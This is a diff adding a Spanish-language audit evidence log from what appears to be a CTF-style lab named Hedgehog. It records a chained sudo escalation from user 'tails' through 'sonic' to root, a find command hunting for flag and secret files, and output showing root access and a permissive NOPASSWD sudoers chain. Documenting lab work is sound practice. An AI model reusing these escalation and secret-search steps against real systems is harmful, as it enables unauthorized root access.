@@ -1,0 +1,32 @@
+================================================================
+ Hedgehog — Evidencia de auditoria (fuerza bruta SSH + movimiento lateral)
+ Fecha (UTC) : 2026-10-19T21:53:42Z
+ Objetivo    : 172.17.0.2
+ Usuario     : tails
+ Fase        : Fase 4 — Shell root y busqueda de banderas
+ Comando     : sudo -n -u sonic sudo -n -u root sh -c 'id; hostname; ls -la /root; find / -xdev -type f \( -iname *flag* -o -iname *bandera* -o -iname *secret* \)'
+================================================================
+
+uid=0(root) gid=0(root) groups=0(root)
+
+378958b2c98e
+
+--- /root ---
+total 24
+drwx------ 1 root root 4096 Oct 29  2024 .
+drwxr-xr-x 1 root root 4096 Oct 19 23:33 ..
+-rw------- 1 root root  150 Oct 29  2024 .bash_history
+-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
+-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
+drwx------ 2 root root 4096 Oct 29  2024 .ssh
+
+--- ficheros de bandera ---
+/usr/share/zoneinfo/America/Bahia_Banderas
+/usr/lib/x86_64-linux-gnu/perl/5.38.2/bits/waitflags.ph
+/usr/lib/x86_64-linux-gnu/perl/5.38.2/bits/ss_flags.ph
+/usr/lib/python3.12/__pycache__/secrets.cpython-312.pyc
+/usr/lib/python3.12/secrets.py
+
+--- sudoers ---
+tails ALL=(sonic) NOPASSWD:ALL
+sonic ALL=(ALL) NOPASSWD:ALL
